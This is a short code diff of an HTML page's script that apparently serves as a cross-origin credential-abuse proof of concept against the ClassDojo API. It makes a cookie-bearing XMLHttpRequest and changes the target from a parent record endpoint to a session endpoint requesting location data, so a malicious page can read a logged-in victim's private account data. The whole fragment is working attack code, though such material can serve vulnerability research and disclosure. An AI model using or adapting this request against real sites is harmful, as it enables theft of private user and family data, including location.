@@ -10,7 +10,7 @@
     <script>
         var req = new XMLHttpRequest(); 
         req.onload = reqListener; 
-        req.open('GET', 'https://home.classdojo.com/api/parent/6798b1f597e4f30b273dea95', true); 
+        req.open('GET', 'https://home.classdojo.com/api/session?includeExtras=location', true); 
         req.withCredentials = true; // Send cookies with the request
         req.send();
 
